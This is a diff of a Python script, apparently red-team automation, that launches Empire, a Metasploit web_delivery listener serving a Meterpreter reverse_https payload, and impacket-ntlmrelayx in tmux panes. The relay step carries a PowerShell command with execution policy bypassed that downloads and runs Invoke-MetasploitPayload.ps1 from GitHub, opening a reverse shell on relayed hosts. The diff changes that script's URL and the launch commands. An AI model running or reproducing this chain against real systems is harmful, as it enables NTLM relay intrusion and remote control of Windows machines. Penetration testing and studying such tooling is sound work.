@@ -106,14 +106,14 @@ def main():
     
     if launch_empire:
         print("\nLaunching Empire Server(waiting 10s)...")
-        command = 'powershell-empire server'
+        command = 'python3 empire.py server'
         tmux_pane.send_keys(command)
         time.sleep(10)
         
         tmux_pane = tmux_pane.split_window()
         
         print("\nLaunching Empire Client(waiting 20s)...")
-        command = 'powershell-empire client -r /opt/scripts/listener_http.rc'
+        command = 'python3 empire.py client -r /opt/scripts/listener_http.rc'
         tmux_pane.send_keys(command)
         time.sleep(20)
         
@@ -136,7 +136,7 @@ def main():
         command = 'msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set uripath /; set ssl true; set srvport %s; set payload windows/meterpreter/reverse_https; set exitonsession false; set lhost %s; set lport %s; set enablestageencoding true; set autorunscript migrate -f; exploit -j -z"' % (msf_srvport, host_ip, msf_lport)
         tmux_pane.send_keys(command)
         
-        relayx_command = 'powershell -nop -exec bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Invoke-MetasploitPayload.ps1\'); Invoke-MetasploitPayload \'https://%s:%s/\'"' % (host_ip, msf_srvport)
+        relayx_command = 'powershell -nop -exec bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/code_execution/Invoke-MetasploitPayload.ps1\'); Invoke-MetasploitPayload \'https://%s:%s/\'"' % (host_ip, msf_srvport)
         
         tmux_pane = tmux_pane.split_window()
         
@@ -151,7 +151,7 @@ def main():
         if os.path.exists("/tmp/hosts-signing-false"):
             command = "impacket-ntlmrelayx -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
         else:
-            command = "impacket-ntlmrelayx -smb2support -c '%s'" % (relayx_command)
+            command = "impacket-ntlmrelayx -smb2support -socks -c '%s'" % (relayx_command)
             
         
         tmux_pane.send_keys(command)
